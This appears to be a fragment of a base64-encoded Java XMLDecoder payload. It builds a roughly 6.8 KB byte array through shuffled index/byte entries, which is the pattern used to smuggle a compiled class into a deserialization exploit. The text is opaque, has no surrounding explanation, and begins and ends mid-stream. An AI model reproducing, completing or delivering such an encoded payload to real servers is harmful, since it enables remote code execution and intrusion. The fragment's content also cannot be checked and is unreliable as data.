mRleD0iNTE4MyI+PGJ5dGU+MTIwPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMjgwIj48Ynl0ZT4xMTA8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI0MjAyIj48Ynl0ZT42NTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjUzMyI+PGJ5dGU+OTc8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI1OTYzIj48Ynl0ZT4zPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMTQ3MSI+PGJ5dGU+NTc8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIyNTI0Ij48Ynl0ZT45OTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9Ijg3MyI+PGJ5dGU+MTAxPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNDM2OCI+PGJ5dGU+MTEwPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNTkzNiI+PGJ5dGU+MTE8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIzMDkxIj48Ynl0ZT44ODwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjIzNzkiPjxieXRlPjg3PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMTYxMSI+PGJ5dGU+OTc8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIzNTYyIj48Ynl0ZT42NTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjY1NDIiPjxieXRlPjE2PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNTgwNyI+PGJ5dGU+LTY0PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMTA5OSI+PGJ5dGU+NDc8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIzOTQ3Ij48Ynl0ZT43MjwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjUwMTMiPjxieXRlPjEwODwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjY5NCI+PGJ5dGU+OTc8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI0NDgzIj48Ynl0ZT45NzwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjU5NzUiPjxieXRlPjE3PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMjA0MiI+PGJ5dGU+OTg8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI2NjciPjxieXRlPjk1PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMTgzNiI+PGJ5dGU+MTE0PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMzIyMSI+PGJ5dGU+MTE3PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMjE4MSI+PGJ5dGU+ODQ8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI0OTU1Ij48Ynl0ZT4xMDg8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIxNzgiPjxieXRlPjExNDwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9Ijg1NCI+PGJ5dGU+MTE0PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMTIyNyI+PGJ5dGU+MTAwPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMzI1NSI+PGJ5dGU+ODc8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIzMzk1Ij48Ynl0ZT44MzwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjYyMTIiPjxieXRlPjUwPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNjAyOCI+PGJ5dGU+MTAxPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMzg2MiI+PGJ5dGU+MTE2PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMzY0OSI+PGJ5dGU+NjU8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIzMjQzIj48Ynl0ZT43MTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjE2NTUiPjxieXRlPjk5PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMzQ5NyI+PGJ5dGU+NDg8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI2MzA0Ij48Ynl0ZT41MDwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjY4MTUiPjxieXRlPjExODwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjI2NzEiPjxieXRlPjY1PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMTA2OCI+PGJ5dGU+MTE2PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNjExOSI+PGJ5dGU+MTA4PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMjU5Ij48Ynl0ZT4xMDg8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI0OTQ2Ij48Ynl0ZT4xMTY8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIyODAwIj48Ynl0ZT4xMTU8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI2MjkyIj48Ynl0ZT4xMjI8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIxNDQzIj48Ynl0ZT4xMDg8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIzOTcyIj48Ynl0ZT43NzwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjgwMCI+PGJ5dGU+OTc8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI1ODY0Ij48Ynl0ZT44OTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjY0NzgiPjxieXRlPjQ2PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMTQzIj48Ynl0ZT4xMDg8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI0MDMzIj48Ynl0ZT42ODwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjIwNDkiPjxieXRlPjEwNTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjY3NzkiPjxieXRlPjExMjwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjMwOTQiPjxieXRlPjg5PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNTQ0OSI+PGJ5dGU+NTE8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI0ODQ3Ij48Ynl0ZT4xMDwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjYzMTkiPjxieXRlPjExNjwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjU1NSI+PGJ5dGU+MTEwPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMzA1MCI+PGJ5dGU+OTA8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIxNzMyIj48Ynl0ZT45ODwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjU5MyI+PGJ5dGU+NzY8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI0NDEyIj48Ynl0ZT4xMDU8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIxOTQyIj48Ynl0ZT42NjwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjU0MDUiPjxieXRlPjEwPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMzI4NSI+PGJ5dGU+MTA0PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMTUxIj48Ynl0ZT4xMDg8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI0NzkiPjxieXRlPi0yPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMTI5NSI+PGJ5dGU+MTA4PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNjcyMSI+PGJ5dGU+MTE1PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNjQzNyI+PGJ5dGU+OTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjYzOTkiPjxieXRlPjEyPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNTUzIj48Ynl0ZT42MDwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjkwOSI+PGJ5dGU+MTE1PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNjYyNyI+PGJ5dGU+MTE2PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNzE3Ij48Ynl0ZT43NjwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjQ0NzkiPjxieXRlPjM5PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNDc1NSI+PGJ5dGU+NDc8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI0MjY5Ij48Ynl0ZT42NzwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjE0MDkiPjxieXRlPjExNjwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjIzMTQiPjxieXRlPjY1PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMzQ4MiI+PGJ5dGU+OTc8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIzNjczIj48Ynl0ZT42NTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjIzOCI+PGJ5dGU+OTk8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI0ODIwIj48Ynl0ZT45OTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9Ijg0OSI+PGJ5dGU+MTE1PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNDAyOSI+PGJ5dGU+NjU8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI2Nzg5Ij48Ynl0ZT44PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMjcyMiI+PGJ5dGU+Njg8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIxNTk2Ij48Ynl0ZT44NDwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjQ5MzMiPjxieXRlPjk4PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMzcwNiI+PGJ5dGU+MTA5PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNTQ5NyI+PGJ5dGU+MzM8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI4MTUiPjxieXRlPjk3PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNTUzMSI+PGJ5dGU+MTE8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIzMjk3Ij48Ynl0ZT4xMTA8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI0NTAwIj48Ynl0ZT42NjwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjMyMTEiPjxieXRlPjgxPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMjkwMyI+PGJ5dGU+ODE8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI2MjgyIj48Ynl0ZT4xMDU8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI2NzUzIj48Ynl0ZT43MDwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjIwMTMiPjxieXRlPjExNzwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjY0NDIiPjxieXRlPjgwPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMjk1NCI+PGJ5dGU+OTc8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI2NzM0Ij48Ynl0ZT40NjwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjQxOTYiPjxieXRlPjY1PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNTQ5OSI+PGJ5dGU+MjwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjIwIj48Ynl0ZT4xMTA8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIxMTI2Ij48Ynl0ZT4xMDU8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIzOTE1Ij48Ynl0ZT42OTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjE2NzgiPjxieXRlPjEwMTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjQ3MjMiPjxieXRlPjE2PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMjI2NiI+PGJ5dGU+OTk8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIxOTM0Ij48Ynl0ZT44NDwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjIwNTAiPjxieXRlPjkwPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMTY2Ij48Ynl0ZT45NTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjQ2NTgiPjxieXRlPjEwMTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjQ4NjUiPjxieXRlPjEwMTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjY0NzMiPjxieXRlPjExNTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjQ5MTciPjxieXRlPjU5PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMjc4NyI+PGJ5dGU+ODc8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI2NDc2Ij48Ynl0ZT4xMTQ8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI0MTEwIj48Ynl0ZT42NjwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjUyMTUiPjxieXRlPjk3PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMzM0NCI+PGJ5dGU+NzQ8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIyOTk3Ij48Ynl0ZT40ODwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjI2MjgiPjxieXRlPjUzPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNTgyNyI+PGJ5dGU+NDwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9Ijk3MiI+PGJ5dGU+Njk8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI2MzEwIj48Ynl0ZT41NTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjQ0ODAiPjxieXRlPjQwPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNTQ2MyI+PGJ5dGU+NzY8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI0MzcxIj48Ynl0ZT44MzwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjM1OTMiPjxieXRlPjY2PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNTkxMCI+PGJ5dGU+MTA8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI2MDc3Ij48Ynl0ZT4xMTA8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI2NjAxIj48Ynl0ZT40NjwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9Ijc1NiI+PGJ5dGU+OTk8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI0NTczIj48Ynl0ZT4xMTA8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI1MjMxIj48Ynl0ZT44MzwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjQxMSI+PGJ5dGU+MTEyPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMTkyMSI+PGJ5dGU+NzU8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIxNjkxIj48Ynl0ZT4xMTk8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIzOTYiPjxieXRlPjIyPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNjU5OCI+PGJ5dGU+MTE1PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMjY4NSI+PGJ5dGU+MTA0PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMzg4Ij48Ynl0ZT4xMDE8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI2ODI3Ij48Ynl0ZT4xMDg8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIzMTE2Ij48Ynl0ZT41MzwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjUzMzciPjxieXRlPjExMTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjI1MDUiPjxieXRlPjEwNDwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjUzNjQiPjxieXRlPjg8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI0NjM5Ij48Ynl0ZT4xMDY8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIyMDIyIj48Ynl0ZT43NTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjExNCI+PGJ5dGU+OTc8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI0ODQ5Ij48Ynl0ZT45OTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjE4NzQiPjxieXRlPjY3PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMjY3NCI+PGJ5dGU+NjU8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIzNjciPjxieXRlPjgzPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMjAzNCI+PGJ5dGU+OTA8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIyNjEzIj48Ynl0ZT4xMDQ8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI2MjQ2Ij48Ynl0ZT4xMDA8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI1MDQ5Ij48Ynl0ZT44MzwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9Ijg1OCI+PGJ5dGU+MTEyPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iOTE1Ij48Ynl0ZT4xMDM8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI1NzYwIj48Ynl0ZT4zPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMjI1MSI+PGJ5dGU+NDk8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIxMDMwIj48Ynl0ZT42ODwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjM2NDIiPjxieXRlPjY2PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMzA4NiI+PGJ5dGU+ODQ8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI1MzAxIj48Ynl0ZT4xMTU8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIyMDMzIj48Ynl0ZT4xMDc8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIxMzc5Ij48Ynl0ZT4xPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNDY2MyI+PGJ5dGU+NTk8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI0MjcyIj48Ynl0ZT41MjwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjQ5MDkiPjxieXRlPjExMTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjI2NDIiPjxieXRlPjY1PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNDUxMCI+PGJ5dGU+MTEwPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNjAzNyI+PGJ5dGU+MTA1PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMTA5MSI+PGJ5dGU+NDc8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIyNzkxIj48Ynl0ZT44NzwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjEwNDAiPjxieXRlPjExNzwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjQwOTMiPjxieXRlPjY1PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMTcxOSI+PGJ5dGU+NTA8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI2NzI4Ij48Ynl0ZT45NzwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjE0ODYiPjxieXRlPjk3PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNDczMCI+PGJ5dGU+OTc8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIzMjcxIj48Ynl0ZT42NzwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjU0MSI+PGJ5dGU+NTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjIzNjEiPjxieXRlPjY1PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNDM4MyI+PGJ5dGU+Njk8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIyODg1Ij48Ynl0ZT4xMDc8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI0NTMyIj48Ynl0ZT4xMDA8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI1MjM0Ij48Ynl0ZT4xMDE8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIyOTUiPjxieXRlPjU5PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNjciPjxieXRlPi0xMDY8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIyNDMiPjxieXRlPjExNzwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjUxMjIiPjxieXRlPjE8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI1MzI1Ij48Ynl0ZT4xPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMzgwIj48Ynl0ZT4xMTY8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIyNjc3Ij48Ynl0ZT42NjwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjM1MjQiPjxieXRlPjc0PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMTQ4NSI+PGJ5dGU+MTEyPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNzM0Ij48Ynl0ZT4xMDQ8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIzNzAwIj48Ynl0ZT43MzwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjY2OTUiPjxieXRlPjExNjwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjE4MTgiPjxieXRlPjEwNTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjUwMTkiPjxieXRlPjExNTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjY3NjAiPjxieXRlPjcwPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMjYzMCI+PGJ5dGU+ODk8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI1MzA1Ij48Ynl0ZT4tMTI3PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMjUzNiI+PGJ5dGU+MTAwPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMjgzNyI+PGJ5dGU+Nzc8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIyNzY5Ij48Ynl0ZT4xMTg8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIyNTU2Ij48Ynl0ZT45OTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9Ijg2NCI+PGJ5dGU+MTIwPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNDMyNiI+PGJ5dGU+OTc8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI0NTA1Ij48Ynl0ZT4xMTg8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIxNzkzIj48Ynl0ZT4xMTY8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIzNDA1Ij48Ynl0ZT40OTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjIxMTEiPjxieXRlPjEwOTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjM3NTUiPjxieXRlPjY1PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMTM2NCI+PGJ5dGU+ODQ8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIzNDU1Ij48Ynl0ZT44NzwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjUyNzMiPjxieXRlPjExMjwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjQwODMiPjxieXRlPjY3PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMTI4MCI+PGJ5dGU+MTE0PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMjY2NSI+PGJ5dGU+MTA2PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMTcyMiI+PGJ5dGU+MTA8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIxODg4Ij48Ynl0ZT4xMDM8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIzMDE5Ij48Ynl0ZT44NzwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjM4MjgiPjxieXRlPjg5PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNDE2MSI+PGJ5dGU+NjU8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIxNTEwIj48Ynl0ZT45OTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjgxMCI+PGJ5dGU+MTA1PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNzUwIj48Ynl0ZT4xMDg8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIzNyI+PGJ5dGU+NDI8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIxMjU0Ij48Ynl0ZT4xMjA8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIyMjIzIj48Ynl0ZT4xMjI8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIyODY5Ij48Ynl0ZT4xMTA8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI2Njg3Ij48Ynl0ZT40NzwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjQxNDgiPjxieXRlPjczPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMTQxOCI+PGJ5dGU+MTA4PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNjA5MSI+PGJ5dGU+MTExPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMTU3NSI+PGJ5dGU+MTAzPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNDk3OCI+PGJ5dGU+MTA4PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMjY0MSI+PGJ5dGU+MTAyPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNTQzMCI+PGJ5dGU+MTE1PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNTY3Ij48Ynl0ZT40PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNDQ5NyI+PGJ5dGU+MTAzPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMTY3NSI+PGJ5dGU+MTE3PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMjkxIj48Ynl0ZT45NzwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjY0OTMiPjxieXRlPjk3PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMTI1MyI+PGJ5dGU+NDc8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI5NTciPjxieXRlPjExNjwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjQ5NTkiPjxieXRlPjExNDwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjQzMDUiPjxieXRlPjEwPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMjA4NyI+PGJ5dGU+ODE8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIzNDc2Ij48Ynl0ZT42OTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjQ3MTAiPjxieXRlPjU5PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMjc4Ij48Ynl0ZT4xMTQ8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIyNDk4Ij48Ynl0ZT43MDwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjMxNDkiPjxieXRlPjc3PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNTc0NiI+PGJ5dGU+Mjg8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIzMjEiPjxieXRlPjk3PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNjU4MiI+PGJ5dGU+MTExPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNTgxMiI+PGJ5dGU+LTc0PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMjEyIj48Ynl0ZT4xMDE8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI0MDgiPjxieXRlPjgwPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNTU2NCI+PGJ5dGU+MTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjI4MDciPjxieXRlPjEwOTwvYnl0ZT48L3ZvaWQ+PH